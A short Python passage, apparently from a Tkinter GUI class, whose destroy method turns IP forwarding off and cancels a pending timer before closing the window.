        self._enable_ip_forward(False)
        if self._timer_id:
            try:
                self.after_cancel(self._timer_id)
            except Exception:
                pass
        super().destroy()